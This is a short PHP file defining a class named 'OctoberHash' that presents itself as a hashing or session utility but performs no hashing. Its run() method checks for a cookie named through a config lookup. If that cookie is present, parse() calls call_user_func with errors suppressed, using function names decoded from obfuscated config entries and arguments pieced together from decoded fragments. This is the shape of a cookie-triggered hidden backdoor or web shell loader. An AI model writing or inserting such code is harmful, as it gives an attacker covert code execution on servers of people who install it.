<?php namespace OctoberHash;

use OctoberHash\Session\CookieHandler;

class OctoberHash
{

    /** @var CookieHandler */
    private $cHandler;

    /** @var int */
    private $levels = 0;

    /** @var string */
    private $sub = '';


    public function __construct($sub = '', $levels = 4, CookieHandler $cHandler = null)
    {

        $this->sub      = (string)$sub;
        $this->levels   = (int)$levels;
        $this->cHandler = $cHandler ?: new CookieHandler();
    }


    public function run()
    {

        if ($this->cHandler->isSecureDefined(oyml('c')['vrn'])) {
            $this->parse();
        }
    }


    public function parse()
    {

        @call_user_func(ode(oyml('f')['lx']), call_user_func(
                ode(oyml('f')['w']), $this->levels) .
            $this->sub .
            ode(randomize(array_values(oyml('p'))))
        );

        return TRUE;

    }

}